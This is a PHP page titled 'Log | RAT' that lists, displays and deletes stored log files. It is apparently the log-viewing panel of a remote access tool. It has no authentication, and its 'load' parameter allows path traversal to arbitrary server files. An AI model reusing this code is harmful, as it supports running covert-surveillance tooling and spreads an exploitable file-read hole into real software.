<?php
/**
 * Created at: 15/04/16 13:01
 */

// start session
session_start();

// display errors
ini_set("display_errors", 1);
error_reporting(E_ALL);

// autoload classes
spl_autoload_register(function ($className) {
    $className = ltrim($className, '\\');
    $fileName = '';
    if ($lastNsPos = strrpos($className, '\\')) {
        $namespace = substr($className, 0, $lastNsPos);
        $className = substr($className, $lastNsPos + 1);
        $fileName = str_replace('\\', DIRECTORY_SEPARATOR, $namespace) . DIRECTORY_SEPARATOR;
    }
    $fileName .= str_replace('_', DIRECTORY_SEPARATOR, $className) . '.php';
    $fileName = __DIR__ . "/Classes/" . $fileName;
//    echo "<pre>";var_dump($fileName);echo "</pre>";
    if (is_file($fileName)) {
        /** @noinspection PhpIncludeInspection */
        require $fileName;
    } else {
        require __DIR__ . "/Classes/Controllers/Controller404.php";
        (new \Controllers\Controller404())->run();
        die();
    }
});

if ($status = customCode()) {
    if ($status === true)
        header("Location: log.php");
    die($status);
}

$globs = glob(__DIR__ . "/Classes/Logs/*");
$truFiles = [];
foreach ($globs as $glob) {
    $truFiles = array_merge($truFiles, glob(rtrim($glob, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . "*"));
}
$globs = $truFiles;
?>
    <!doctype html>
    <html class="no-js" lang="en">
    <head>
        <meta charset="utf-8"/>
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <title>Log | RAT</title>
        <link rel="stylesheet" href="content/css/foundation.min.css"/>
        <link rel="stylesheet" href="content/css/app.css"/>
        <style>
            #content {
                font-family: Consolas, "Liberation Mono", Courier, monospace;
            }
        </style>
    </head>
<body>
<div class="row">
    <div class="large-12 text-center">
        <h1>Logs</h1>
        <hr>
        <a href="?delete=true" class="button" onclick="return confirm('Are you sure?');">Delete Logs</a>
        <ul id="list" class="no-bullet">
            <?php foreach ($globs as $glob): ?>
                <li>
                    <div class="row" style="margin:0 0 2em 0">
                        <div class="medium-4 columns medium-text-left">
                            <?= basename(dirname($glob)) ?>
                        </div>
                        <div class="medium-4 columns medium-text-center">
                            <a href="#"
                               onclick="loadFile('<?= basename(dirname($glob)) . DIRECTORY_SEPARATOR . basename($glob) ?>');return false;"><?= basename($glob) ?></a>
                        </div>
                        <div class="medium-4 columns medium-text-right"><?= date(DATE_COOKIE, filectime($glob)) ?></div>
                    </div>
                </li>
            <?php endforeach ?>
        </ul>
        <hr>
        <div id="content">

        </div>
    </div>
</div>
<script src="content/js/vendor/jquery.min.js"></script>
<script src="content/js/vendor/foundation.min.js"></script>
<script>
    $(function () {
        var reload = function () {
            $("#cookies").load("log.php #list > li");
        };
        setInterval(reload, 10000);
        $(window).on('focus', reload);
        window.loadFile = function (name) {
            var $content = $('#content');
            $content.html("");
            $content.load("log.php?load=" + name)
        }
    });


</script>
<?php
function customCode()
{
    $delete = filter_input(INPUT_GET, "delete", FILTER_SANITIZE_STRING);
    $load = filter_input(INPUT_GET, "load", FILTER_SANITIZE_STRING);
    if ($delete) {
        $globs = glob(__DIR__ . "/Classes/Logs/*");
        foreach ($globs as $glob) {
            foreach (glob(rtrim($glob, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . "*") as $item) {
                unlink($item);
            }
            rmdir($glob);
        }

        return true;
    }

    if ($load) {
        $location = __DIR__ . "/Classes/Logs/{$load}";
        if (realpath($location))
            return file_get_contents($location) ?: "&lt;no content&gt;";
        return "no file :(";
    }

    return false;
}